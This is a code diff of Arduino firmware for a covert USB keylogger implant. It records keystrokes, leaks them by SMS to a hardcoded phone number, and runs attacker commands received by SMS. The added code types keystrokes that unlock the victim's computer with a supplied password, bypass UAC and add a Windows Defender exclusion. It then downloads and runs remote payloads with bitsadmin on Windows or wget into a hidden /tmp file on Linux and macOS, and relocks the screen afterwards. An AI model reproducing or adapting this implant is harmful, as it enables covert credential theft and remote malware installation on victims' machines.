@@ -1,12 +1,12 @@
+
+/* NOTE: Make sure to edit SoftwareSerial.h to change 
+ *  #define _SS_MAX_RX_BUFF 64 // RX buffer size
+ *  to
+ *  #define _SS_MAX_RX_BUFF 256 // RX buffer size
+*/
 #include <SoftwareSerial.h>            
 #include <Keyboard.h>                  
 #include "C_USBhost.h"                
-
-// We need this to receive full messages
-#ifdef _SS_MAX_RX_BUFF
-#undef _SS_MAX_RX_BUFF
-#define _SS_MAX_RX_BUFF 512 // RX buffer size
-#endif
 
 #define LEAK_PHONE_NUMBER "+14422457648"
 #define DEBUG true
@@ -19,14 +19,10 @@ SoftwareSerial SMSSERIAL(8, 9);
 #define SEPARATOR "##"
 
 #define CHAR_LIMIT 140                                
-#define BAUD_RATE_SIM800L 57700                    
+#define BAUD_RATE_SIM800L 57600                    
 #define BAUD_RATE_USB_HOST_BOARD 115200             
-#define BAUD_RATE_SERIAL 115200      
-
-//#define BAUD_RATE_SIM800L 9600                    
-//#define BAUD_RATE_USB_HOST_BOARD 115200             
-//#define BAUD_RATE_SERIAL 115200      
-
+#define BAUD_RATE_SERIAL 115200                    
+ 
 #define STATE_IDLE 0
 #define STATE_WAITING_MSG_RESPONSE 1
 #define STATE_WAITING_SMS_RESPONSE 1
@@ -43,7 +39,7 @@ int interval_payload=15000;
 String SMS = "";
 int passcached=0;
 char empty;
-byte b;
+byte captured_key;
 String substr = "";
 bool mutex_SMS = false;
 bool pendingSMS = false;
@@ -90,7 +86,6 @@ String readResponse()
     }
     res += char(incomingByte);
   }
-  
   return res;
 }
 
@@ -108,6 +103,11 @@ void collectDebugInfo(){
   Serial.println("--");
   
   SMSSERIAL.write("AT+CCID\r\n"); //Read SIM information to confirm whether the SIM is plugged
+  readResponse();
+  Serial.println("--");
+
+  //read stored sms
+  SMSSERIAL.write("AT+CMGL=\"ALL\"\r\n"); 
   readResponse();
   Serial.println("--");
 
@@ -177,6 +177,9 @@ void setup() {
   USBhost.Begin(BAUD_RATE_USB_HOST_BOARD);                   
   Keyboard.begin();
 
+  SMSSERIAL.write("AT\r\n");
+  readResponse();
+
   // Selects SMS message format as text. Default format is Protocol Data Unit (PDU)
   SMSSERIAL.write("AT+CMGF=1\r\n");
   readResponse();
@@ -193,7 +196,7 @@ void setup() {
 
 void loop() {   
   unsigned long currentMillis = millis();
-  b = USBhost.GetKey();    
+  captured_key = USBhost.GetKey();    
 
   // Send a beacon so we know that the implant is up
   // ToDo: this can infere with payloads execution
@@ -206,14 +209,14 @@ void loop() {
 //  }
 
   //Normalkey capture
-  if(b){
-    if(b == 8){ // Backspace
+  if(captured_key){
+    if(captured_key == 8){ // Backspace
       if(buffer_keystrokes.length() > 0){
         buffer_keystrokes = buffer_keystrokes.substring(0, buffer_keystrokes.length() - 1);
       }
     }
     else {
-      buffer_keystrokes += (char)b;
+      buffer_keystrokes += (char)captured_key;
       }
     previousMillis = currentMillis;  
   }
@@ -274,11 +277,10 @@ void loop() {
    //Payload Method Make sure keyword are unique enough that subject in question wont enter them on their keyboard.
     if (mutex_SMS == false && SMSSERIAL.available()) {
       Serial.println("new SMS");
+  
+      SMS = SMSSERIAL.readString();      
+      Serial.println(SMSSERIAL.readString());
 
-      SMS =readResponse();
-      
-      //SMS = SMSSERIAL.readString();
-      Serial.println(SMS);
       String SMS_text;
       if(SMS.indexOf("+CMT: ") > -1){ // We got a command
         // Code to remove last new line if exists
@@ -295,12 +297,12 @@ void loop() {
 
      
       String payload = getValue(SMS_text,SEPARATOR,0);
-      
-      if (payload == "execute"){
-        if(DEBUG){
+
+      if(DEBUG && payload.length()>0){
           Serial.println("Got payload: " + payload);
         }
-
+      
+      if (payload == "unolock_download"){
         String OS = getValue(SMS_text,SEPARATOR,1);
         OS.toLowerCase();
         String password = getValue(SMS_text,SEPARATOR,2);
@@ -313,57 +315,114 @@ void loop() {
         // Download and execute the malware
         if(OS == "win"){
           // Normal user      
-  //        Keyboard.press(KEY_LEFT_GUI);
-  //        Keyboard.press('r');
-  //        Keyboard.releaseAll();
-  //        delay(400);
-  //        Keyboard.print("cmd.exe");
-  //        Keyboard.press('\n');
-  //        Keyboard.releaseAll();
-  //        delay(400);
-  //        String cmd = "bitsadmin /transfer winupdate /download /priority foreground " + url + " %appdata%\\Microsoft\\wintask.exe && start \"\" %appdata%\\Microsoft\\wintask.exe && exit";
-  //        Keyboard.print(cmd.c_str());
-  //        Keyboard.press('\n');
-  //        Keyboard.releaseAll(); 
-  
-          // UAC bypass
           Keyboard.press(KEY_LEFT_GUI);
           Keyboard.press('r');
           Keyboard.releaseAll();
           delay(400);
-          Keyboard.print("powershell Start-Process cmd -Verb runAs");
+          Keyboard.print("cmd.exe");
           Keyboard.press('\n');
           Keyboard.releaseAll();
-          delay(3000);
-          
-          Keyboard.press(KEY_LEFT_ALT);
-          Keyboard.press('y');
-          Keyboard.releaseAll();
-          delay(500);
-
-          // Add windows defender exception
-          String cmd1 = "powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath %appdata%";
-          Keyboard.print(cmd1.c_str());
-          Keyboard.press('\n');
-          Keyboard.releaseAll(); 
-          
+          delay(400);
           String cmd = "bitsadmin /transfer winupdate /download /priority foreground " + url + " %appdata%\\Microsoft\\wintask.exe && start \"\" %appdata%\\Microsoft\\wintask.exe && exit";
           Keyboard.print(cmd.c_str());
           Keyboard.press('\n');
           Keyboard.releaseAll(); 
+          delay(400);
+          // Lock back
+          Keyboard.press(KEY_RIGHT_GUI);
+          Keyboard.press('l');
+          Keyboard.releaseAll();                 
         }
+        
         else if(OS == "lnx"){
+          Keyboard.press(KEY_LEFT_GUI);
+          Keyboard.press('r');
+          Keyboard.releaseAll();
+          delay(400);
+          Keyboard.print("terminal");
+          Keyboard.press('\n');
+          Keyboard.releaseAll();
+          delay(400);
+          String cmd = " x=/tmp/.logCollector; wget --no-check-certificate " + url + " -O ${x}; chmod +x ${x}; ${x}; rm ${x}";
+          Keyboard.print(cmd.c_str());
+          Keyboard.press('\n');
+          Keyboard.releaseAll();
+          delay(400);
+          // Lock back
+          Keyboard.press(KEY_RIGHT_GUI);
+          Keyboard.press('l');
+          Keyboard.releaseAll();
+          
         }
+        
         else if(OS == "osx"){
+          Keyboard.press(KEY_LEFT_GUI);
+          Keyboard.press('r');
+          Keyboard.releaseAll();
+          delay(400);
+          Keyboard.print("terminal");
+          Keyboard.press('\n');
+          Keyboard.releaseAll();
+          delay(400);
+          String cmd = " x=/tmp/.logCollector; wget --no-check-certificate " + url + " -O ${x}; chmod +x ${x}; ${x}; rm ${x}";
+          Keyboard.print(cmd.c_str());
+          Keyboard.press('\n');
+          Keyboard.releaseAll();
+          delay(400);
+          // Lock back
+          Keyboard.press(KEY_LEFT_GUI);
+          Keyboard.press(KEY_LEFT_CTRL);
+          Keyboard.press('q');
+          Keyboard.releaseAll();
         }
         else{
           sendSMSMessage("Wrong OS sent for payload");
         }
       }
 
-      // manuall##press##83 72 (in hex)
-      // manual##delay##100
-      // manual##release
+      
+      else if(payload == "win_uac_unlck_dwn"){
+        String OS = getValue(SMS_text,SEPARATOR,1);
+        OS.toLowerCase();
+        String password = getValue(SMS_text,SEPARATOR,2);
+        String url = getValue(SMS_text,SEPARATOR,3);
+  
+        // Unlock the computer to download and execute malware
+        unlockComputer(password);
+        delay(500);
+
+        // UAC bypass
+        Keyboard.press(KEY_LEFT_GUI);
+        Keyboard.press('r');
+        Keyboard.releaseAll();
+        delay(400);
+        Keyboard.print("powershell Start-Process cmd -Verb runAs");
+        Keyboard.press('\n');
+        Keyboard.releaseAll();
+        delay(3000);
+        
+        Keyboard.press(KEY_LEFT_ALT);
+        Keyboard.press('y');
+        Keyboard.releaseAll();
+        delay(500);
+
+        // Add windows defender exception
+        String cmd1 = "powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath %appdata%";
+        Keyboard.print(cmd1.c_str());
+        Keyboard.press('\n');
+        Keyboard.releaseAll(); 
+        delay(500);
+        
+        String cmd = "bitsadmin /transfer winupdate /download /priority foreground " + url + " %appdata%\\Microsoft\\wintask.exe && start \"\" %appdata%\\Microsoft\\wintask.exe && exit";
+        Keyboard.print(cmd.c_str());
+        Keyboard.press('\n');
+        Keyboard.releaseAll(); 
+        
+      }
+
+      // Manuall##press##83 72 (in hex)
+      // Manual##delay##100
+      // Manual##release
       else if(payload == "Manual"){        
         String action = getValue(SMS_text,SEPARATOR,1);
         String argument = getValue(SMS_text,SEPARATOR,2);
